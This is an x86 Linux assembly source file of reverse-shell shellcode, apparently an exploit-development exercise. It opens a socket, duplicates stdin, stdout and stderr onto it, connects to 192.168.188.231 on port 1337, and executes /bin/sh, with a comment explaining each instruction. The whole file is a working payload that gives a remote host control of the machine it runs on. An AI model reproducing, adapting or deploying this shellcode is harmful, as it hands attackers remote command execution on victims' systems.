;Author: clubjk



global _start

section .text

_start:
 
  ; create socket  with socketcall()
  ; socketcall(int call, unsigned long *args)

  ; socketcall is 102 (0x66)

  ; int socket(int domain, int type, int protocol)
  ;      1         2          1           6
  ; returns 7 in the socketfd

  ; eax = 0x66
  ; ebx = 0x1
  ; ecx = ptr to socket's args, from stack in reverse order

                   
 mov al, 0x66                    ; 0x66 in eax (102)
 push ebx                        ; push 0 on the stack
 mov bl, 0x1                     ; move 1 into the ebx
 push byte 0x1                   ; push 1 on stack (type is 1 (SOCK_STREAM))
 push byte 0x2                   ; push 2 on stack (domain is 2 (AF_INET))
 mov ecx, esp                    ; move memloc of esp to eax (eax = socket(AF_INET, SOCK_STREAM, 0))
 int 0x80                        ; calls the socket system call, will return the fc (0x07) to the eax

 
 ; Redirect input, output, and error output to the socket with dup2
 ; int dup2(int oldfd, int newfd)
 ; (stdin = 0, stdout = 1, stderror = 2)
 ; dup2 is 63 or 0x3f 
 ; ebx = socketfd
 ; ecx = fd (from 2 to 0)


 xchg eax, ebx                   ; ebx = 7, eax = 1
 pop ecx                         ; ecx = 2 (loop count)



 loop:
      mov al, 0x3f               ; eax = 63 = dup2()
      int 0x80                   ; dup2(socketfd, ecx)
      dec ecx                    ; decrement ecx from stderror to stdin
      jns loop                   ; loop until ZF is set

  
 ; connect
 ; int connect(int sockfd, const struct sockaddr *addr[sin_family, sin_port, sin_addr], socklen_t addrlen)
 ; connect(socketfd, [2, port, IP], 16)
 
 ; eax = 0x66 = socketcall()
 ; ebx = 0x3 = connect()
 ; ecx = ptr to connect's args

 mov al, 0x66                    ; 0x66 = 102 = socketcall()
 push dword 0xe7bca8c0           ; ip 192.168.188.231
 push word 0x3905                ; port 1337
 push word 0x0002                ; sin_family = 2 (AF_INET)
 mov ecx, esp                    ; move memloc of args addr structure to ecx
 push byte 0x10                  ; addr_len = 16 (structure size)
 push ecx                        ; push ptr of args structure
 push ebx                        ; ebx = socketfd
 mov bl, 0x3                     ; ebx = 3 = connect()
 mov ecx, esp                    ; move memloc of args socketfd
 int 0x80                        ; connect system call



 
 ; execute a /bin/sh shell
 ; execve(const char *filename, char *const argv[filename], char *const envp[])
 ; execve(/bin//sh, memloc of /bin/sh string, 0)

 ; eax = 0xb = execve [11]
 ; ebx = memloc of "/bin//sh" string
 ; ecx = memloc args string
 ; edx = *envp

 xor eax, eax
 push edx                        ; edx = 0x00000000
 push dword 0x68732f2f           ; push //sh
 push dword 0x6e69622f           ; push /bin 
 mov ebx, esp                    ; ebx = ptr to memloc of "/bin//sh" string
 push edx                        ; edx = 0x00000000
 mov edx, esp                    ; edx = ptr to NULL address
 push ebx                        ; pointer to memloc of args ( 0X00, /bin//sh, 0X00000000, &/bin//sh)
 mov ecx, esp                    ; ecx points to argv
 mov al, 0xb                     ; move execve system call number 11 to eax
 int 0x80                        ; execve /bin/sh
